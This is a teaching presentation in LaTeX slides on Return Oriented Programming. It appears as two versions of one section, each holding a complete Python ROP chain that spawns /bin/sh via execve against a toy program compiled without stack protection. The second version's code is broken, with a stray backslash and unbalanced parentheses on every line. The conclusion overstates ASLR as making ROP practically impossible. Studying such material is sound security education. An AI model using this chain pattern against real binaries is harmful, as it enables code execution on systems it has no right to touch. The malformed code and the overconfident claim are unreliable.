Return Oriented Programming

### 2023-02-10 presentation.tex
changes

\section{Example: Open a shell}
\subsection{Target Program}
\begin{frame}
    \frametitle{Target Program and compilation}
    \begin{lstlisting}[breaklines, style=commandline]
clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
    \end{lstlisting}

    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
\end{frame}
\subsection{General approach}
\begin{frame}[fragile]
    \frametitle{Spawning a shell: Approach}
    \begin{itemize}
        \item Using ropper we can find our desired gadgets
        \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
        \begin{enumerate}
            \item write /bin/sh into memory (at the data segment)
            \item init systemcall number (11)
            \item init systemcall argument (address of /bin//sh)
            \item call systemcall
        \end{enumerate}
    \end{itemize}
\end{frame}
\subsection{Generating the payload}
\begin{frame}[fragile]
    \frametitle{Generating the payload, writing /bin}
    \begin{lstlisting}[style=code, language=python]
from struct import pack

p = 'AAAABBBBCCCC'
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f6c) # @ .data
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080b526a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, writing //sh}
    \begin{lstlisting}[style=code, language=python]
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f70) # @ .data + 4
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080b526a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, init params}
    \begin{lstlisting}[style=code, language=python]
# write null byte after /bin/sh
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x00000000) # @ NULL
p += pack('<I', 0x080506c0) # xor eax, eax ; ret
p += pack('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
# write address of /bin/sh to ebx
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080f0f6c) # @ .data
# arguments and environment to ecx,edx
p += pack('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += pack('<I', 0x080f0f74) # @ .data + 8
p += pack('<I', 0x00000000) # @ NULL
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, init params, syscall}
    \begin{lstlisting}[style=code, language=python]
p += pack('<I', 0x080506c0) # xor eax, eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08082a9e) # inc eax ; ret
p += pack('<I', 0x08049b2a) # int 0x80
print p
    \end{lstlisting}
\end{frame}
\section{Conclusion}
\begin{frame}
    \frametitle{Conclusion}
    \begin{itemize}
        \item Return Oriented Programming is a very powerful technique
        \item It is able to execute any system call if there are enough rop gadgets
        \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
        \item Modern desktops use aslr and other protection mechanisms $\rightarrow$ practically impossible to use ROP
    \end{itemize}
\end{frame}

>>>>

\section{Example: Open a shell}
\subsection{Target Program and Compilation}
\begin{frame}[fragile]
    \frametitle{Target Program and Compliation}
    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
    \bltCommand{compilation.sh}{Compilation command}{comp}
\end{frame}
\subsection{General approach}
\begin{frame}[fragile]
    \frametitle{Spawning a shell: Approach}
    \begin{itemize}
        \item Using ropper we can find our desired gadgets
        \item Lets say we want to execute a shell using execve, for that we need to accomplish the following goals
        \begin{enumerate}
            \item write /bin/sh into memory (at the data segment)
            \item init systemcall number (11)
            \item init systemcall argument (address of /bin//sh)
            \item call systemcall
        \end{enumerate}
    \end{itemize}
\end{frame}
\subsection{Generating the payload}
\begin{frame}[fragile]
    \frametitle{Generating the payload, writing /bin}
    \begin{lstlisting}[style=code, language=python]
from struct import pack

p = 'AAAABBBBCCCC'
p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack\('<I', 0x080f0f6c) # @ .data
p += str(pack\('<I', 0x00000000) # @ NULL
p += str(pack\('<I', 0x080b526a) # pop eax ; ret
p += '/bin'
p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, writing //sh}
    \begin{lstlisting}[style=code, language=python]
p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack\('<I', 0x080f0f70) # @ .data + 4
p += str(pack\('<I', 0x00000000) # @ NULL
p += str(pack\('<I', 0x080b526a) # pop eax ; ret
p += '//sh'
p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, init params}
    \begin{lstlisting}[style=code, language=python]
# write null byte after /bin/sh
p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack\('<I', 0x080f0f74) # @ .data + 8
p += str(pack\('<I', 0x00000000) # @ NULL
p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
# write address of /bin/sh to ebx
p += str(pack\('<I', 0x08049022) # pop ebx ; ret
p += str(pack\('<I', 0x080f0f6c) # @ .data
# arguments and environment to ecx,edx
p += str(pack\('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
p += str(pack\('<I', 0x080f0f74) # @ .data + 8
p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
p += str(pack\('<I', 0x080f0f74) # @ .data + 8
p += str(pack\('<I', 0x00000000) # @ NULL
    \end{lstlisting}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Generating the payload, init params, syscall}
    \begin{lstlisting}[style=code, language=python]
p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
p += str(pack\('<I', 0x08049b2a) # int 0x80
print p
    \end{lstlisting}
\end{frame}
\section{Conclusion}
\begin{frame}
    \frametitle{Conclusion}
    \begin{itemize}
        \item Return Oriented Programming is a very powerful technique
        \item It is able to execute any system call if there are enough rop gadgets
        \item There are many tools to simplify the process of finding ROP gadgets and generatating ROP payloads
        \item Modern desktops use aslr and other protection mechanisms $\rightarrow$ practically impossible to use ROP
    \end{itemize}
\end{frame}
